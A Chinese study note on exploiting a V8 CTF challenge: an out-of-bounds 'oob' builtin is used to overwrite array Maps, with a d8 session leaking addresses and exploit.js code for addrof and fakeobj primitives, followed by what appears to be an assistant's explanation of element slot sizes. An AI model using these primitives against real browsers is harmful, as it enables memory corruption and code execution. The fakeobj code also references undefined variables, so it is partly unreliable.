    浮点型数组¶

    定义方式：let arr=[1.1, 2.2, 3.3, 4.4];¶

    js数组也可以使用属性的形式访问: 例如arr.a=1; 这个属性a在PropertyArray中的propertyN中存储。

    对象型数组¶

    定义方式：let arr=[{x:1},{y:2}];¶

    js对象¶

    定义方式：let v={};¶

    查看添加到的 src/builtins/builtins-array.cc 代码并尝试发现漏洞。即使没有任何进一步的背景信息，它也应该很容易发现。

    • 该函数最初将检查参数数是否大于 2（第一个参数始终是 this 参数）。如果是，则返回 undefined。
    • 如果只有一个参数 （this），它会将数组转换为 FixedDoubleArray，然后返回 array[length] 的元素。
    • 如果有两个参数（this 和 value），它会将 value 作为浮点数写入 array[length]。

    现在，由于数组以索引 0 开头，因此很明显 array[length] 会导致数组末尾的一个索引进行越界访问。

    检查 GDB 中的任何地址都需要你在检查之前从地址中减去 1（以掩盖最后一位）。

    什么是地图？¶

    既然我们知道我们有能力覆盖 JSArray 的 Map，那么我们必须了解什么是 Map，以便弄清楚如何利用此漏洞。

    本节将仅简要介绍什么是 Map。Saelo 在他的 phrack 论文中对此进行了更深入的介绍。如果需要，我敦促读者阅读它。

    Saelo 的 Phrack 论文说：

    对象的 Map（数组是对象）是一种数据结构，其中包含如下信息：

    • 对象的动态类型，即 String、Uint8Array、HeapNumber、...
    • 对象的大小（以字节为单位）
    • 对象的属性及其存储位置
    • 数组元素的类型，例如未装箱的双精度或标记指针
    • 对象的原型（如果有）

    虽然属性名称通常存储在 Map 中，但属性值存储在对象本身的几个可能区域之一中。然后，Map 会提供属性值在相应区域中的确切位置。

    实质上，Map 定义了应如何访问对象。无论你是通过执行 object[“field”] 来访问一个对象，还是通过执行 array[index] 来访问一个数组，该对象/数组的 Map 都会告诉 JS 引擎在内存中的什么位置找到该特定元素。首先使用 Map 的原因是查找值非常昂贵。地图就像一本字典。如果多个对象/数组具有相同的布局，则可以共享同一映射。同样，请查看 saelo 的 phrack paper 了解更多详情。

    例如，还记得上面的 JSArray 吗？如果您尝试访问 a[0]，JSArray 的 Map 将告诉 JS 引擎转到数组，访问其 elements 指针，并返回 elements[2] 处的值，因为它对应于 1.1 的索引 0 处的值（如果这没有意义，请向上滚动）。

    请记住，我们有能力用我们自己的 Map 覆盖数组的 Map。这样，如果我们用另一个数组的 map 覆盖一个数组的 map，我们可能会在 JS 引擎中造成类型混淆。

    为了了解我们如何滥用这一点，让我们看看不同数组的 map 是什么样子的。我们以 Object 数组为例：

    如您所见，对象数组的 Map 略有不同。float 数组在索引 0 处具有 float 值，而 object 数组在同一位置具有实际 obj 的地址。如果你尝试访问 obj_arr[0]，它不仅会打印出索引 0 处 obj 的内存地址的浮点表示，还会以某种方式解析它并打印 {A： 1.1}。

    那么，如果我们泄漏了浮点数组的 map 并用它覆盖了对象数组的 map，会发生什么呢？它不应该将索引 0 视为内存地址，而应该将其视为 float 值。访问索引 0 应该会将 obj 的地址作为浮点数泄露，对吧？

    d8> var float_arr_map = float_arr.oob();
undefined
d8> var obj = {"A":1.1};
undefined
d8> var obj_arr = [obj];
undefined
d8> obj_arr.oob(float_arr_map); <- overwrite obj_arr's map
undefined
d8> "0x" + ftoi(obj_arr[0]).toString(16);
"0x3541b65506a9"
d8> %DebugPrint(obj);
0x3541b65506a9 <Object map = 0x391a4148ab39>
{A: 1.1}

    成功！在 JS 引擎开发术语中，这就是所谓的 addrof 原语。与此相反（如果我们将内存地址放在 float 数组的索引 0 并将其 map 更改为对象数组的 map）称为 fakeobj 原语，因为它允许您将 fake object 放置在内存中的任何位置，以便读取和写入它。我们可以将这个假对象放在一个内存区域中，在那里我们可以控制它的 Map 和元素指针，这样我们就可以很容易地读取和写入任意内存地址。

    现在，我们可以将这些函数作为 addrof 和 fakeobj 函数添加到 exploit.js 脚本中，如下所示：

    /// Construct addrof primitive
var temp_obj = {"A":1};
var obj_arr = [temp_obj];
var fl_arr = [1.1, 1.2, 1.3, 1.4];
var map1 = obj_arr.oob();
var map2 = fl_arr.oob();

function addrof(in_obj) {
    // First, put the obj whose address we want to find into index 0
    obj_arr[0] = in_obj;

    // Change the obj array's map to the float array's map
    obj_arr.oob(map2);

    // Get the address by accessing index 0
    let addr = obj_arr[0];

    // Set the map back
    obj_arr.oob(map1);

    // Return the address as a BigInt
    return ftoi(addr);
}

function fakeobj(addr) {
    // First, put the address as a float into index 0 of the float array
    float_arr[0] = itof(addr);

    // Change the float array's map to the obj array's map
    float_arr.oob(obj_arr_map);

    // Get a "fake" object at that memory location and store it
    let fake = float_arr[0];

    // Set the map back
    float_arr.oob(float_arr_map);

    // Return the object
    return fake;
}

    **不同类型的数组 Map **¶

    V8 支持不同类型的数组，且每种数组类型有不同的 Map：

    • PackedSmiElements：代表一个存储 整型（即 Smi）的数组。Smi 是一种在 V8 中优化的小整数类型。
    • PackedDoubleElements：代表一个存储 浮动点数（Float64）的数组。
    • PackedElements：代表一个存储 对象引用 的数组（例如对象数组）。
    • HoleySmiElements 或 HoleyDoubleElements：代表一个 稀疏 数组，其中数组中的元素可能存在 "孔"（即未定义的元素），通常是 undefined 或 hole。

    要分情况，不能一句话说死成“一个 element 就是固定多少字节”。

    在 V8 里，elements 里的“一个元素槽位”大小，主要看这个数组的 elements kind。

    1. 对象元素数组：¶

    PACKED_ELEMENTS / HOLEY_ELEMENTS¶

    这种像你前面的：

    let victim = [{x:1},{y:2}];

    elements 通常是 FixedArray，里面放的是对象引用（tagged value）。

    槽位大小¶

    在你现在这种常见 64 位 + pointer compression 的 V8 里，通常是：

    每个元素槽位 4 字节

    因为放的是压缩后的 tagged 值。

    所以：

    • FixedArray[2] 的两个元素槽本身通常一共占 2 * 4 = 8 字节
    • 再加上 FixedArray 自己的头部

    注意，这说的是：

    槽位大小

    不是你看到的对象本体 {x:1}、{y:2} 大小。对象本体还是在别处。

    2. 双精度数组：PACKED_DOUBLE_ELEMENTS / HOLEY_DOUBLE_ELEMENTS**¶

    这种数组里，elements 通常是 FixedDoubleArray。

    槽位大小¶

    这里每个元素是一个 double，所以通常是：

    每个元素 8 字节

    这也是你前面看到地址计算里经常出现：

    base + 8 + index * 8

    的原因。

    3. Smi / 数值元素¶

    如果是 PACKED_SMI_ELEMENTS，在现代 V8 常见实现里，元素槽位也是放 tagged value，所以通常也按：

    每槽 4 字节（压缩指针/tagged 表示）

    但它里面装的是 Smi 编码值，不是对象引用。

    你现在最该记的版本¶

    在你当前分析 V8 exploit/CTF 的语境下，先记这张表最实用：

    elements kind backing store 类型 单个元素槽大小
    PACKED_ELEMENTS / HOLEY_ELEMENTS FixedArray 4 字节
    PACKED_SMI_ELEMENTS / HOLEY_SMI_ELEMENTS FixedArray 4 字节
    PACKED_DOUBLE_ELEMENTS / HOLEY_DOUBLE_ELEMENTS FixedDoubleArray 8 字节

    这个表在 64 位 + pointer compression 的 V8 里非常常用。

    为什么你前面看到两个对象地址差¶

    0x30¶

    ，却不是“一个 element 占 0x30”¶

    因为：

    • elements[0] 槽位里只放了一个引用
    • elements[1] 槽位里也只放了一个引用

    槽位本身并不大。

    你看到的：

    0x...a659
0x...a689

    差 0x30，那是两个对象本体在堆上的地址差，不是元素槽大小。

    最短总结¶

    如果你问的是 V8 里 elements backing store 的一个槽位多大，那在你现在最常见的环境里：

    • 对象元素 / Smi 元素：4 字节一个槽
    • double 元素：8 字节一个槽

    你要的话，我下一条可以继续讲：

    FixedArray 和 FixedDoubleArray 的头部各占多少，以及为什么很多地址计算里会有 +8。
